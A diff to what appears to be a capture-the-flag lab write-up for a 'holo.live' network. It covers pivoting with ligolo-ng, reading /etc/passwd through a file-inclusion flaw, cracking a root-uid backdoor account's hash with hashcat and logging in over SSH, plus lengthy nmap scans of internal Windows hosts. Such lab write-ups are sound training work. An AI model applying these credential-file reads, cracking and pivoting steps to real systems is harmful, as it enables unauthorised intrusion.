@@ -918,7 +918,7 @@ Add route to the victim subnet
     ip route add 192.168.100.0/24   dev ligolo
 Start the server on the attacker:
 
-    ./ligolo_proxy -selfcer
+    ./ligolo_proxy -selfcert
 
 Coming back to the victim, start the agent:
 
@@ -952,7 +952,7 @@ Apart the victim, we found another active host in the network, that actualy is t
 The wonderful thing of ligolo-ng is that it operates in a tunnell mode, like a VPN, so we can directly visit the http services with our browser. Actually we found a copy of the the main site on port 80 and a copy of the dev site on 8080. Again I used the LFI vulnerability to download <b>/etc/passwd</b> file, even if generally it's not useful in modern Linux system, this time I found an entry that I tried to reverse using hashcat:
 
     zeus:$6$Zs4KmlUsMiwVLy2y$V8S5G3q7tpBMZip8Iv/H6i5ctHVFf6.fS.HXBw9Kyv96Qbc2ZHzHlYHkaHm8A5toyMA3J53JU.dc6ZCjRxhjV1:0:0:root:/root:/bin/bash
-This seems to be a persistence technique, maybe inserted by another user (?). Since that user will have a root shell once logged in, it deserve to try to reverse the password.
+Probably the entry was created by another user in the LAB to have persistence on the system, so probably once the Lab is reset you wont find this account anymore. There is another way of course that involves to have access as non privileged user to the system to escalate to root, I will cover it at the end of this section. Anyway I proceeded tryning to reverse the user password, since that user will have a root shell once logged in, for sure it deserves a try:
 I run hashcat on my winzoz box to take advantage of my GPU:
 
     hashcat.exe -a 0 -m 1800 zeux.txt C:\Users\filippo\wordlist\rockyou.txt
@@ -966,14 +966,13 @@ I run hashcat on my winzoz box to take advantage of my GPU:
 To me it tooks 2 minutes to reverse the password having NVIDIA GF 4050. Since port SSH is open we can try to login to the remote host:
 
     ssh zeus@192.168.100.1
-Strange enough once logged in we are root!
 
     root@ip-10-200-95-33:~# users
     zeus
     root@ip-10-200-95-33:~# id zeus 
     uid=0(root) gid=0(root) groups=0(root)
     root@ip-10-200-95-33:~# 
-since the uid for zeus is set to 0!
+Since the uid for zeus is set to 0, we are root.
 ### Flag submissions 2 and 3
 You can find these flags.
 
@@ -986,7 +985,235 @@ Futher investigate the server we can notice we <i>escaped</i> from a DOcker cont
     eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
         inet 10.200.95.33  netmask 255.255.255.0  broadcast 10.200.95.255
 
-We can notice that using SSH, through docker interface, we were able to login on the host machine.
+We can notice that using SSH, through docker interface, we were able to login on the host machine. From this host we can perform a further host discovery on the 10.200.95.0/24 subnet. Luckily nmap is already installed on the server:
+
+    root@ip-10-200-95-33:~# whereis nmap
+    nmap: /usr/bin/nmap /usr/share/nmap /usr/share/man/man1/nmap.1.gz
+
+We can proceed to perform an hosts discovery from the server (please note that we have already performed this scan through the VPN in the initial phase 
+
+    nmap -sn  10.200.95.0/24
+    Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-11 07:35 UTC
+    Nmap scan report for ip-10-200-95-1.eu-west-1.compute.internal (10.200.95.1)
+    Host is up (0.00014s latency).
+    MAC Address: 02:63:DC:A0:13:35 (Unknown)
+    Nmap scan report for ip-10-200-95-30.eu-west-1.compute.internal (10.200.95.30)
+    Host is up (0.00034s latency).
+    MAC Address: 02:E1:49:12:02:89 (Unknown)
+    Nmap scan report for ip-10-200-95-31.eu-west-1.compute.internal (10.200.95.31)
+    Host is up (0.00045s latency).
+    MAC Address: 02:2E:32:D4:EF:DF (Unknown)
+    Nmap scan report for ip-10-200-95-32.eu-west-1.compute.internal (10.200.95.32)
+    Host is up (0.00032s latency).
+    MAC Address: 02:6D:98:96:8D:63 (Unknown)
+    Nmap scan report for ip-10-200-95-35.eu-west-1.compute.internal (10.200.95.35)
+    Host is up (0.00037s latency).
+    MAC Address: 02:45:FB:50:E0:27 (Unknown)
+    Nmap scan report for ip-10-200-95-250.eu-west-1.compute.internal (10.200.95.250)
+    Host is up (0.00020s latency).
+    MAC Address: 02:6A:9F:5F:BA:47 (Unknown)
+    Nmap scan report for ip-10-200-95-33.eu-west-1.compute.internal (10.200.95.33)
+    Host is up.
+    Nmap done: 256 IP addresses (7 hosts up) scanned in 1.70 seconds
+
+So we have 5 hosts, excluding the IP .33 (current machine), .1 is the GW, we can proceed with services fingerprint as follows:
+
+    nmap -sVC -n 10.200.95.30,31,32,35,250
+    
+    Nmap scan report for 10.200.95.30
+    Host is up (0.00063s latency).
+    Not shown: 987 closed ports
+    PORT     STATE SERVICE       VERSION
+    53/tcp   open  domain?
+    | fingerprint-strings: 
+    |   DNSVersionBindReqTCP: 
+    |     version
+    |_    bind
+    80/tcp   open  http          Microsoft IIS httpd 10.0
+    | http-methods: 
+    |_  Potentially risky methods: TRACE
+    |_http-server-header: Microsoft-IIS/10.0
+    |_http-title: IIS Windows Server
+    88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-11 07:45:49Z)
+    135/tcp  open  msrpc         Microsoft Windows RPC
+    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+    389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: holo.live0., Site: Default-First-Site-Name)
+    445/tcp  open  microsoft-ds?
+    464/tcp  open  kpasswd5?
+    593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+    636/tcp  open  tcpwrapped
+    3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: holo.live0., Site: Default-First-Site-Name)
+    3269/tcp open  tcpwrapped
+    3389/tcp open  ms-wbt-server Microsoft Terminal Services
+    | rdp-ntlm-info: 
+    |   Target_Name: HOLOLIVE
+    |   NetBIOS_Domain_Name: HOLOLIVE
+    |   NetBIOS_Computer_Name: DC-SRV01
+    |   DNS_Domain_Name: holo.live
+    |   DNS_Computer_Name: DC-SRV01.holo.live
+    |   DNS_Tree_Name: holo.live
+    |   Product_Version: 10.0.17763
+    |_  System_Time: 2024-06-11T07:48:16+00:00
+    | ssl-cert: Subject: commonName=DC-SRV01.holo.live
+    | Not valid before: 2024-06-08T04:01:58
+    |_Not valid after:  2024-12-08T04:01:58
+    |_ssl-date: 2024-06-11T07:48:31+00:00; 0s from scanner time.
+    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+    SF-Port53-TCP:V=7.80%I=7%D=6/11%Time=666800B2%P=x86_64-pc-linux-gnu%r(DNSV
+    SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+    SF:x04bind\0\0\x10\0\x03");
+    MAC Address: 02:E1:49:12:02:89 (Unknown)
+    Service Info: Host: DC-SRV01; OS: Windows; CPE: cpe:/o:microsoft:windows
+    
+    Host script results:
+    |_nbstat: NetBIOS name: DC-SRV01, NetBIOS user: <unknown>, NetBIOS MAC: 02:e1:49:12:02:89 (unknown)
+    | smb2-security-mode: 
+    |   2.02: 
+    |_    Message signing enabled but not required
+    | smb2-time: 
+    |   date: 2024-06-11T07:48:16
+    |_  start_date: N/A
+    
+    Nmap scan report for 10.200.95.31
+    Host is up (0.00041s latency).
+    Not shown: 992 closed ports
+    PORT     STATE SERVICE       VERSION
+    22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
+    | ssh-hostkey: 
+    |   2048 7c:c4:6b:4c:f5:73:58:dc:d6:ac:3c:bd:21:7e:67:3b (RSA)
+    |   256 f1:83:ba:c1:94:ab:35:7c:44:00:26:55:9d:13:7b:94 (ECDSA)
+    |_  256 32:86:c6:52:b3:61:27:71:ff:6d:9f:8d:f9:86:16:83 (ED25519)
+    80/tcp   open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.11)
+    |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11
+    |_http-title: Holo.live - Virtual Events
+    135/tcp  open  msrpc         Microsoft Windows RPC
+    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+    443/tcp  open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.11)
+    |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11
+    |_http-title: Holo.live - Virtual Events
+    | ssl-cert: Subject: commonName=localhost
+    | Not valid before: 2009-11-10T23:48:47
+    |_Not valid after:  2019-11-08T23:48:47
+    |_ssl-date: TLS randomness does not represent time
+    | tls-alpn: 
+    |_  http/1.1
+    445/tcp  open  microsoft-ds?
+    3306/tcp open  mysql?
+    3389/tcp open  ms-wbt-server Microsoft Terminal Services
+    | rdp-ntlm-info: 
+    |   Target_Name: HOLOLIVE
+    |   NetBIOS_Domain_Name: HOLOLIVE
+    |   NetBIOS_Computer_Name: S-SRV01
+    |   DNS_Domain_Name: holo.live
+    |   DNS_Computer_Name: S-SRV01.holo.live
+    |   DNS_Tree_Name: holo.live
+    |   Product_Version: 10.0.17763
+    |_  System_Time: 2024-06-11T07:48:16+00:00
+    | ssl-cert: Subject: commonName=S-SRV01.holo.live
+    | Not valid before: 2024-06-08T04:01:55
+    |_Not valid after:  2024-12-08T04:01:55
+    |_ssl-date: 2024-06-11T07:48:31+00:00; 0s from scanner time.
+    MAC Address: 02:2E:32:D4:EF:DF (Unknown)
+    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+    
+    Host script results:
+    |_nbstat: NetBIOS name: S-SRV01, NetBIOS user: <unknown>, NetBIOS MAC: 02:2e:32:d4:ef:df (unknown)
+    | smb2-security-mode: 
+    |   2.02: 
+    |_    Message signing enabled but not required
+    | smb2-time: 
+    |   date: 2024-06-11T07:48:16
+    |_  start_date: N/A
+    
+    Nmap scan report for 10.200.95.32
+    Host is up (0.00029s latency).
+    Not shown: 999 filtered ports
+    PORT     STATE SERVICE       VERSION
+    3389/tcp open  ms-wbt-server Microsoft Terminal Services
+    | rdp-ntlm-info: 
+    |   Target_Name: HOLOLIVE
+    |   NetBIOS_Domain_Name: HOLOLIVE
+    |   NetBIOS_Computer_Name: S-SRV02
+    |   DNS_Domain_Name: holo.live
+    |   DNS_Computer_Name: S-SRV02.holo.live
+    |   DNS_Tree_Name: holo.live
+    |   Product_Version: 10.0.17763
+    |_  System_Time: 2024-06-11T07:48:16+00:00
+    | ssl-cert: Subject: commonName=S-SRV02.holo.live
+    | Not valid before: 2024-06-08T04:01:58
+    |_Not valid after:  2024-12-08T04:01:58
+    |_ssl-date: 2024-06-11T07:48:31+00:00; 0s from scanner time.
+    MAC Address: 02:6D:98:96:8D:63 (Unknown)
+    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+    
+    Nmap scan report for 10.200.95.35
+    Host is up (0.00040s latency).
+    Not shown: 995 closed ports
+    PORT     STATE SERVICE       VERSION
+    80/tcp   open  http          Microsoft IIS httpd 10.0
+    | http-methods: 
+    |_  Potentially risky methods: TRACE
+    |_http-server-header: Microsoft-IIS/10.0
+    |_http-title: IIS Windows Server
+    135/tcp  open  msrpc         Microsoft Windows RPC
+    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+    445/tcp  open  microsoft-ds?
+    3389/tcp open  ms-wbt-server Microsoft Terminal Services
+    | rdp-ntlm-info: 
+    |   Target_Name: HOLOLIVE
+    |   NetBIOS_Domain_Name: HOLOLIVE
+    |   NetBIOS_Computer_Name: PC-FILESRV01
+    |   DNS_Domain_Name: holo.live
+    |   DNS_Computer_Name: PC-FILESRV01.holo.live
+    |   DNS_Tree_Name: holo.live
+    |   Product_Version: 10.0.17763
+    |_  System_Time: 2024-06-11T07:48:17+00:00
+    | ssl-cert: Subject: commonName=PC-FILESRV01.holo.live
+    | Not valid before: 2024-06-08T04:01:58
+    |_Not valid after:  2024-12-08T04:01:58
+    |_ssl-date: 2024-06-11T07:48:31+00:00; 0s from scanner time.
+    MAC Address: 02:45:FB:50:E0:27 (Unknown)
+    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+    
+    Host script results:
+    |_nbstat: NetBIOS name: PC-FILESRV01, NetBIOS user: <unknown>, NetBIOS MAC: 02:45:fb:50:e0:27 (unknown)
+    | smb2-security-mode: 
+    |   2.02: 
+    |_    Message signing enabled but not required
+    | smb2-time: 
+    |   date: 2024-06-11T07:48:17
+    |_  start_date: N/A
+    
+    Nmap scan report for 10.200.95.250
+    Host is up (0.0058s latency).
+    Not shown: 999 closed ports
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey: 
+    |   2048 d8:21:7f:15:75:65:77:cd:6b:47:b6:a9:ff:4e:ef:b1 (RSA)
+    |   256 e6:6a:17:5c:df:57:b6:f4:ed:07:b0:c3:a4:bf:60:a5 (ECDSA)
+    |_  256 df:42:4a:4d:78:04:ab:f4:e8:a9:05:24:2d:03:0a:e3 (ED25519)
+    MAC Address: 02:6A:9F:5F:BA:47 (Unknown)
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+    
+    Post-scan script results:
+    | clock-skew: 
+    |   0s: 
+    |     10.200.95.35
+    |     10.200.95.30
+    |     10.200.95.31
+    |_    10.200.95.32
+    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 5 IP addresses (5 hosts up) scanned in 224.81 seconds
+
+
+From the above results we can infer that
+- .30 host is the DC
+- .31 and .32 are 2 windows servers
+- .35 is probably a windows file server PC-FILESRV01
+- .250 is *nix box having hosting SSH server
+
+
 
     
 
